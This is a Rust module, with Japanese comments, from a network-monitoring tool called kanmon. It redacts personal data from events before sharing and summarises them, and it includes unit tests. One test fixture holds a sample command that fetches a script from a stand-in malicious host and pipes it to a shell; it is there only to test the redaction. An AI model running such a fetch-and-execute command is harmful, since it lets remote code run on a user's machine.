//! 共有用の書き出し（v0.5.3）：イベントから個人や環境が分かる値を伏せる・集計する。
//!
//! 伏せるもの：IP（宛先・送信元・DNS の答え・文字列の中の IP）、ホスト名、ユーザー名、ホームのパス、
//! メールアドレス、URL のクエリ、コマンドの引数（秘密が入りやすいので丸ごと外す）、uid（0 以外）。
//! ドメインはモードで決める（そのまま / 登録ドメインだけ残す / 全部伏せる）。
//! 同じ値には同じ記号を当てる（`IP-1` 等）。対応表は呼び出し側が求めたときだけ返す。
//! 残すもの：ルールの ID・点数・レベル・理由、AS の番号と名前、国、回線の種類、プロセスの名前と署名の種類、ポート。
//!
//! 限界：決まった形の値だけを伏せる。プロジェクト名やリポジトリ名を含むファイル名などは残る。

use regex::{Captures, Regex};
use serde::Serialize;
use serde_json::Value;
use std::collections::{BTreeMap, HashMap};
use std::net::IpAddr;
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DomainMode {
    /// そのまま残す
    Keep,
    /// 登録ドメインだけ残し、その下を伏せる（`api.foo.example.com` → `*.example.com`）
    Registered,
    /// 全部伏せる（`DOMAIN-1`）
    Mask,
}

impl DomainMode {
    pub fn parse(s: &str) -> Option<Self> {
        Some(match s {
            "keep" => Self::Keep,
            "registered" => Self::Registered,
            "mask" => Self::Mask,
            _ => return None,
        })
    }
}

#[derive(Debug, Clone, Copy)]
pub struct Options {
    pub domains: DomainMode,
    /// パスをファイル名だけにする
    pub paths_basename: bool,
    /// 時刻を 1 時間単位に丸める
    pub round_time: bool,
}

impl Default for Options {
    fn default() -> Self {
        Self { domains: DomainMode::Registered, paths_basename: false, round_time: false }
    }
}

/// ドメインとして扱うキー（`dns.question.name` は別に扱う）
const DOMAIN_KEYS: &[&str] = &["domain", "registered_domain", "dest_key"];
/// パスとして扱うキー
const PATH_KEYS: &[&str] = &["executable", "path", "script", "open_paths", "open_top", "proc_key"];

fn re_ip() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    // IPv4、または「:」を 2 つ以上含む 16 進の並び（IPv6 の候補）。解析できたものだけを伏せる
    R.get_or_init(|| Regex::new(r"\b\d{1,3}(?:\.\d{1,3}){3}\b|(?:[0-9A-Fa-f]{0,4}:){2,}[0-9A-Fa-f.]*").unwrap())
}

fn re_home() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"(/Users/|/home/|/var/home/|(?i:[A-Z]:\\Users\\))([^/\\\s:]+)").unwrap())
}

fn re_email() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}").unwrap())
}

fn re_query() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| Regex::new(r#"(https?://[^\s?#"']+)[?#][^\s"']*"#).unwrap())
}

/// 伏せる処理。1 回の書き出しの間、同じ値には同じ記号を当てる
#[derive(Debug, Default)]
pub struct Redactor {
    opts: Options,
    map: HashMap<String, String>,
    counters: HashMap<&'static str, usize>,
}

impl Redactor {
    pub fn new(opts: Options) -> Self {
        Self { opts, ..Default::default() }
    }

    /// 元の値 → 記号の対応表（求められたときだけ使う。共有しないこと）
    pub fn mapping(&self) -> BTreeMap<String, String> {
        self.map.iter().map(|(k, v)| (v.clone(), k.split_once('\u{0}').map(|x| x.1).unwrap_or(k).to_string())).collect()
    }

    fn token(&mut self, kind: &'static str, original: &str) -> String {
        let key = format!("{kind}\u{0}{original}");
        if let Some(t) = self.map.get(&key) {
            return t.clone();
        }
        let n = self.counters.entry(kind).or_insert(0);
        *n += 1;
        let t = format!("{kind}-{n}");
        self.map.insert(key, t.clone());
        t
    }

    fn ip(&mut self, ip: IpAddr, original: &str) -> String {
        // ループバック・未指定・文書用（RFC 5737・RFC 3849）は個人の情報ではないので残す
        let doc = match ip {
            IpAddr::V4(v) => {
                let o = v.octets();
                (o[0] == 192 && o[1] == 0 && o[2] == 2)
                    || (o[0] == 198 && o[1] == 51 && o[2] == 100)
                    || (o[0] == 203 && o[1] == 0 && o[2] == 113)
            }
            IpAddr::V6(v) => v.segments()[0] == 0x2001 && v.segments()[1] == 0x0db8,
        };
        if ip.is_loopback() || ip.is_unspecified() || doc {
            return original.to_string();
        }
        match crate::netclass::scope(&ip) {
            "lan" => self.token("LAN-IP", &ip.to_string()),
            _ => self.token("IP", &ip.to_string()),
        }
    }

    /// 文字列の中の IP・ホームのパス・メール・URL のクエリを伏せる
    pub fn text(&mut self, s: &str) -> String {
        let s = re_query().replace_all(s, "$1?…").into_owned();
        let s = re_email().replace_all(&s, "EMAIL").into_owned();
        let s = re_home().replace_all(&s, |c: &Captures| format!("{}USER", &c[1])).into_owned();
        // IP は記号の採番があるので、手で置き換える
        let mut out = String::with_capacity(s.len());
        let mut last = 0;
        let cands: Vec<(usize, usize)> = re_ip().find_iter(&s).map(|m| (m.start(), m.end())).collect();
        for (a, b) in cands {
            let m = &s[a..b];
            let trimmed = m.trim_end_matches([':', '.']);
            if let Ok(ip) = trimmed.parse::<IpAddr>() {
                out.push_str(&s[last..a]);
                out.push_str(&self.ip(ip, trimmed));
                last = a + trimmed.len();
            }
        }
        out.push_str(&s[last..]);
        out
    }

    fn domain(&mut self, d: &str) -> String {
        // IP や「IP/24」はドメインではない
        if d.split('/').next().is_some_and(|x| x.parse::<IpAddr>().is_ok()) {
            return self.text(d);
        }
        match self.opts.domains {
            DomainMode::Keep => d.to_string(),
            DomainMode::Mask => self.token("DOMAIN", &d.to_ascii_lowercase()),
            DomainMode::Registered => match crate::dga::registered_domain(d) {
                Some(r) if r.eq_ignore_ascii_case(d) => r,
                Some(r) => format!("*.{r}"),
                None => self.token("DOMAIN", &d.to_ascii_lowercase()),
            },
        }
    }

    fn path(&mut self, p: &str) -> String {
        let t = self.text(p);
        if self.opts.paths_basename && (t.contains('/') || t.contains('\\')) {
            let base = t.rsplit(['/', '\\']).next().unwrap_or(&t);
            return format!("…/{base}");
        }
        t
    }

    /// イベント 1 件を伏せた写しを返す
    pub fn event(&mut self, v: &Value) -> Value {
        let mut v = v.clone();
        if let Some(p) = v.get_mut("process").and_then(|p| p.as_object_mut()) {
            // 引数には秘密（トークン・パスワード）が入りやすいので丸ごと外し、数だけ残す
            if let Some(n) = p.remove("args").and_then(|a| a.as_array().map(|x| x.len())) {
                p.insert("args_count".into(), n.into());
            }
            if p.get("uid").and_then(|u| u.as_u64()).is_some_and(|u| u != 0) {
                p.remove("uid");
            }
            if let Some(u) = p.get("user").and_then(|u| u.as_str()).map(str::to_string) {
                let t = if u == "root" { u } else { self.token("USER", &u) };
                p.insert("user".into(), t.into());
            }
        }
        if let Some(h) = v.pointer_mut("/host/name") {
            if let Some(name) = h.as_str().map(str::to_string) {
                *h = self.token("host", &name).into();
            }
        }
        if let Some(q) = v.pointer_mut("/dns/question/name") {
            if let Some(name) = q.as_str().map(str::to_string) {
                *q = self.domain(&name).into();
            }
        }
        if self.opts.round_time {
            if let Some(ts) = v.get_mut("@timestamp") {
                if let Some(t) = ts.as_str().and_then(round_hour) {
                    *ts = t.into();
                }
            }
        }
        self.walk(&mut v, "");
        v
    }

    fn walk(&mut self, v: &mut Value, key: &str) {
        match v {
            Value::Object(m) => {
                for (k, x) in m.iter_mut() {
                    if k == "@timestamp" || (k == "name" && key == "question") {
                        continue;
                    }
                    self.walk(x, k);
                }
            }
            Value::Array(a) => {
                for x in a.iter_mut() {
                    self.walk(x, key);
                }
            }
            Value::String(s) => {
                *s = if DOMAIN_KEYS.contains(&key) {
                    self.domain(s)
                } else if PATH_KEYS.contains(&key) {
                    self.path(s)
                } else {
                    self.text(s)
                };
            }
            _ => {}
        }
    }
}

/// `2026-11-19T18:16:12.123+09:00` → `2026-11-19T18:00:00.000+09:00`
fn round_hour(ts: &str) -> Option<String> {
    let (date_hour, rest) = ts.split_at_checked(13)?;
    let tz = rest.find(['+', '-', 'Z']).map(|i| &rest[i..]).unwrap_or("");
    Some(format!("{date_hour}:00:00.000{tz}"))
}

/// 集計（記事向け）。IP・ドメイン・パスは一切含めない
#[derive(Debug, Clone, Serialize, Default)]
pub struct Summary {
    pub hours: i64,
    pub min_level: String,
    pub total: usize,
    pub by_level: BTreeMap<String, usize>,
    /// ルール ID → （件数, 説明）
    pub by_rule: BTreeMap<String, (usize, String)>,
    /// プロセス名 → 件数（上位 15）
    pub by_process: Vec<(String, usize)>,
    /// 回線の種類 → 件数
    pub by_net_type: BTreeMap<String, usize>,
}

pub fn summarize(events: &[Value], hours: i64, min_level: &str) -> Summary {
    let mut s = Summary { hours, min_level: min_level.into(), total: events.len(), ..Default::default() };
    let mut procs: HashMap<String, usize> = HashMap::new();
    for e in events {
        let lv = e.pointer("/kanmon/level").and_then(|x| x.as_str()).unwrap_or("info");
        *s.by_level.entry(lv.into()).or_insert(0) += 1;
        if let Some(sigs) = e.pointer("/kanmon/signals").and_then(|x| x.as_array()) {
            for h in sigs {
                let id = h["id"].as_str().unwrap_or("?").to_string();
                let desc = h["description"].as_str().or(h["name"].as_str()).unwrap_or("").to_string();
                let ent = s.by_rule.entry(id).or_insert((0, desc));
                ent.0 += 1;
            }
        }
        // プロセス名は、ホームの下の自作のバイナリなどで名前が分かることがあるので、伏せた後の名前で数える
        let name = match e.pointer("/process/name").and_then(|x| x.as_str()) {
            Some(n) => n.to_string(),
            // DNS の改ざん検知・居座りの走査は、プロセスに結び付かない
            None => match e.pointer("/network/kind").and_then(|x| x.as_str()) {
                Some("dns_integrity") => "（DNS の観測）".to_string(),
                Some("persistence") => "（居座りの走査）".to_string(),
                _ => "（不明）".to_string(),
            },
        };
        *procs.entry(name).or_insert(0) += 1;
        if let Some(t) = e.pointer("/kanmon/net_type").and_then(|x| x.as_str()) {
            *s.by_net_type.entry(t.into()).or_insert(0) += 1;
        }
    }
    let mut p: Vec<_> = procs.into_iter().collect();
    p.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
    p.truncate(15);
    s.by_process = p;
    s
}

impl Summary {
    /// Markdown の表（note・GitHub にそのまま貼れる）
    pub fn markdown(&self) -> String {
        let esc = |x: &str| x.replace('|', "\\|");
        let mut o =
            format!("## kanmon の集計（直近 {} 時間・{} 以上、{} 件）\n\n", self.hours, self.min_level, self.total);
        o.push_str("| レベル | 件数 |\n|---|---:|\n");
        for lv in ["critical", "warn", "notice", "info"] {
            if let Some(n) = self.by_level.get(lv) {
                o.push_str(&format!("| {lv} | {n} |\n"));
            }
        }
        if !self.by_rule.is_empty() {
            let mut r: Vec<_> = self.by_rule.iter().collect();
            r.sort_by(|a, b| b.1 .0.cmp(&a.1 .0).then(a.0.cmp(b.0)));
            o.push_str("\n| ルール | 件数 | 内容 |\n|---|---:|---|\n");
            for (id, (n, d)) in r {
                o.push_str(&format!("| {} | {n} | {} |\n", esc(id), esc(d)));
            }
        }
        if !self.by_process.is_empty() {
            o.push_str("\n| プロセス | 件数 |\n|---|---:|\n");
            for (p, n) in &self.by_process {
                o.push_str(&format!("| {} | {n} |\n", esc(p)));
            }
        }
        if !self.by_net_type.is_empty() {
            o.push_str("\n| 宛先の回線 | 件数 |\n|---|---:|\n");
            for (t, n) in &self.by_net_type {
                o.push_str(&format!("| {t} | {n} |\n"));
            }
        }
        o
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn ev() -> Value {
        json!({
            "@timestamp": "2026-11-19T18:16:12.123+09:00",
            "host": {"name": "alice-mbp.local", "os": "macos"},
            "network": {"kind": "connect", "scope": "internet"},
            "process": {"name": "helper", "executable": "/Users/alice/works/secret-proj/bin/helper",
                "args": ["helper", "--token", "ghp_abcdef"], "uid": 501, "user": "alice", "pid": 42},
            "destination": {"ip": "8.8.8.8", "port": 443, "domain": "api.foo.example.com",
                "registered_domain": "example.com", "as": {"number": 15169}},
            "source": {"ip": "192.168.1.10", "port": 50000},
            "kanmon": {"level": "notice", "score": 45, "net_type": "cloud", "dest_key": "example.com",
                "signals": [{"id": "S2", "points": 20, "description": "未署名"}, {"id": "R1", "points": 25, "description": "住宅用"}],
                "persist": {"detail": "curl https://evil.example.net/x?token=abc | sh ; mail bob@example.org ; ssh 8.8.8.8"}}
        })
    }

    #[test]
    fn redacts_personal_values() {
        let mut r = Redactor::new(Options::default());
        let out = r.event(&ev());
        let s = out.to_string();
        for leak in ["alice", "8.8.8.8", "192.168.1.10", "ghp_abcdef", "token=abc", "bob@example.org", "api.foo", "501"]
        {
            assert!(!s.contains(leak), "{leak} が残っている: {s}");
        }
        assert_eq!(out["host"]["name"], "host-1");
        assert_eq!(out["process"]["user"], "USER-1");
        assert_eq!(out["process"]["args_count"], 3);
        assert_eq!(out["process"]["executable"], "/Users/USER/works/secret-proj/bin/helper");
        assert_eq!(out["destination"]["ip"], "IP-1");
        assert_eq!(out["source"]["ip"], "LAN-IP-1");
        assert_eq!(out["destination"]["domain"], "*.example.com");
        assert_eq!(out["destination"]["registered_domain"], "example.com");
        // 文字列の中の同じ IP には同じ記号
        assert!(out["kanmon"]["persist"]["detail"].as_str().unwrap().contains("ssh IP-1"));
        assert!(out["kanmon"]["persist"]["detail"].as_str().unwrap().contains("https://evil.example.net/x?…"));
        // 残すもの
        assert_eq!(out["destination"]["port"], 443);
        assert_eq!(out["destination"]["as"]["number"], 15169);
        assert_eq!(out["kanmon"]["score"], 45);
        assert_eq!(out["process"]["name"], "helper");
        assert_eq!(out["@timestamp"], "2026-11-19T18:16:12.123+09:00");
        // 対応表は求めたときだけ
        assert_eq!(r.mapping().get("IP-1").map(String::as_str), Some("8.8.8.8"));
    }

    #[test]
    fn modes_and_special_ips() {
        let mut r = Redactor::new(Options { domains: DomainMode::Mask, paths_basename: true, round_time: true });
        let out = r.event(&ev());
        assert_eq!(out["destination"]["domain"], "DOMAIN-1");
        assert_eq!(out["destination"]["registered_domain"], "DOMAIN-2");
        assert_eq!(out["kanmon"]["dest_key"], "DOMAIN-2");
        assert_eq!(out["process"]["executable"], "…/helper");
        assert_eq!(out["@timestamp"], "2026-11-19T18:00:00.000+09:00");
        let mut k = Redactor::new(Options { domains: DomainMode::Keep, ..Default::default() });
        assert_eq!(k.event(&ev())["destination"]["domain"], "api.foo.example.com");
        // ループバック・文書用の IP、版の番号、時刻は残す
        let mut r = Redactor::new(Options::default());
        assert_eq!(r.text("127.0.0.1 203.0.113.5 2001:db8::1 ::1"), "127.0.0.1 203.0.113.5 2001:db8::1 ::1");
        assert_eq!(r.text("Versions/157.0.8103.51/x 12:34:56"), "Versions/157.0.8103.51/x 12:34:56");
        assert_eq!(r.text("[2606:4700::1111]:443"), "[IP-1]:443");
        assert_eq!(r.text("C:\\Users\\bob\\x"), "C:\\Users\\USER\\x");
        assert_eq!(r.text("/home/carol/.ssh"), "/home/USER/.ssh");
        assert_eq!(r.domain("203.0.113.0/24"), "203.0.113.0/24");
    }

    #[test]
    fn summary_has_no_addresses() {
        let mut r = Redactor::new(Options::default());
        let evs = vec![r.event(&ev()), r.event(&ev())];
        let s = summarize(&evs, 24, "notice");
        assert_eq!(s.total, 2);
        assert_eq!(s.by_level["notice"], 2);
        assert_eq!(s.by_rule["R1"].0, 2);
        let md = s.markdown();
        assert!(md.contains("| R1 | 2 | 住宅用 |"), "{md}");
        assert!(md.contains("| helper | 2 |"));
        assert!(!md.contains("8.8.8.8") && !md.contains("example"));
        let dns = json!({"network": {"kind": "dns_integrity"}, "kanmon": {"level": "notice"}});
        let s = summarize(&[dns], 24, "notice");
        assert_eq!(s.by_process, vec![("（DNS の観測）".to_string(), 1)]);
    }
}
